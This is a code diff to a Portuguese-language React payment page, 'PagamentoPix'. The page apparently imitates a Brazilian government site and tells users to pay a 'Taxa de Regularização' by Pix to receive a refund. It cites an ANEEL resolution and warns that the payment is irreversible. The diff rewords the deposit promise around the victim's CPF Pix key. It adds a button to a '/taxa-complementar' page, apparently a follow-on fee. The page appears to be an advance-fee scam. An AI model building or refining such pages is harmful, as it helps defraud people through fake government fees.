@@ -588,7 +588,7 @@ export default function PagamentoPix() {
                   </div>
                   <div>
                     <p className="text-[#071D41] font-semibold text-sm mb-1">Informações sobre o depósito</p>
-                    <p className="text-gray-700 text-sm">Após a confirmação do pagamento da Taxa de Regularização, o valor de <span className="font-semibold text-green-700">{valorFormatado}</span> será depositado em sua conta bancária em até <span className="font-semibold">72 horas úteis</span>.</p>
+                    <p className="text-gray-700 text-sm">Após a confirmação do pagamento da Taxa de Regularização, o valor de <span className="font-semibold text-green-700">{valorFormatado}</span> será creditado na conta bancária vinculada à chave Pix CPF ({cpfFormatado}), no prazo de até <span className="font-semibold">72 horas úteis</span>.</p>
                     <div className="mt-2 bg-white/50 rounded p-2 border border-[#1351B4]/20 text-xs text-gray-600">
                       <p>Conforme resolução ANEEL nº 1.000/2021, o processo de restituição é <span className="font-medium text-[#071D41]">irreversível</span> após a confirmação do pagamento da TRE. Os valores serão depositados na conta bancária informada em seu cadastro.</p>
                     </div>
@@ -838,7 +838,16 @@ export default function PagamentoPix() {
                   )}
                 </Button>
 
-                {/* Botão "Avançar para próxima etapa" removido a pedido do cliente */}
+                {/* Botão para avançar para testes */}
+                <Button 
+                  className="mt-3 bg-blue-600 hover:bg-blue-700 text-white w-full py-3 transition-colors duration-300 flex items-center justify-center"
+                  onClick={() => navigate('/taxa-complementar')}
+                >
+                  <div className="flex items-center justify-center">
+                    <ArrowRight className="h-5 w-5 mr-2" />
+                    AVANÇAR PARA TESTE
+                  </div>
+                </Button>
                 
                 <div className="bg-red-600 p-4 rounded-lg text-white shadow-sm">
                   <div className="flex items-center mb-2">
